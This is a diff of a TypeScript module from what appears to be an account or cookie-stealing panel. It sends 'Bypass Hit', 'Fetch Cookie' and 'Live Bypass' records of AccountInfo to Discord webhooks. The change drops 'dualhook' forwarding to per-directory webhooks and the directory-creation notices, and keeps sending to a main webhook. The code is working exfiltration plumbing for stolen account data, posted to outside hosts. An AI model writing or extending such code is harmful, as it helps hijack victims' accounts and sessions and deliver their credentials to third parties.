@@ -279,55 +279,17 @@ export async function sendLiveBypassFailedEmbed(webhookUrl: string, d: AccountIn
 }
 
 export async function broadcastLiveBypass(d: AccountInfo) {
-  const dir = getActiveDirectory();
-  await Promise.all([
-    sendLiveBypassEmbed(getWebhook(WK.liveBypass), d),
-    dir?.liveBypassWebhook ? sendLiveBypassEmbed(dir.liveBypassWebhook, d) : Promise.resolve(),
-  ]);
+  await sendLiveBypassEmbed(getWebhook(WK.liveBypass), d);
 }
 export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string) {
-  const dir = getActiveDirectory();
-  await Promise.all([
-    sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason),
-    dir?.liveBypassWebhook ? sendLiveBypassFailedEmbed(dir.liveBypassWebhook, d, reason) : Promise.resolve(),
-  ]);
+  await sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason);
 }
 
-// Dualhook send — sends to both the directory's webhook AND the main webhook
-export async function dualhookSend(
-  kind: 'bypass' | 'fetch',
-  d: AccountInfo,
-) {
-  const dir = getActiveDirectory();
+// Send a hit (bypass or fetch) to the main webhook for that kind
+export async function dualhookSend(kind: 'bypass' | 'fetch', d: AccountInfo) {
   const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
-  const mainUrl = getWebhook(mainKey);
-  const dirUrl = dir ? (kind === 'bypass' ? dir.bypassWebhook : dir.fetchCookieWebhook) : '';
-
   const tag = kind === 'bypass' ? 'Bypass Hit' : 'Fetch Cookie';
-  await Promise.all([
-    sendHitEmbed(mainUrl, d, { tag: `${tag} · Main` }),
-    dirUrl ? sendHitEmbed(dirUrl, d, { tag: `${tag} · ${dir?.name || 'Directory'}` }) : Promise.resolve(),
-  ]);
-}
-
-// Notify when a new directory is created
-export async function notifyDirectoryCreated(dir: Directory) {
-  const url = getWebhook(WK.directory);
-  if (!url) return;
-  await post(url, {
-    username: BOT_NAME,
-    embeds: [{
-      title: '📁 New Directory Created',
-      color: 0x4f46e5,
-      fields: [
-        { name: 'Name', value: `\`${dir.name}\``, inline: false },
-        { name: 'Bypass Webhook', value: `\`${dir.bypassWebhook ? 'set' : '—'}\``, inline: true },
-        { name: 'Fetch Webhook', value: `\`${dir.fetchCookieWebhook ? 'set' : '—'}\``, inline: true },
-        { name: 'Live Webhook', value: `\`${dir.liveBypassWebhook ? 'set' : '—'}\``, inline: true },
-      ],
-      footer: { text: nowFooter() },
-    }],
-  });
+  await sendHitEmbed(getWebhook(mainKey), d, { tag });
 }
 
 // Backwards-compat shim for any leftover callers
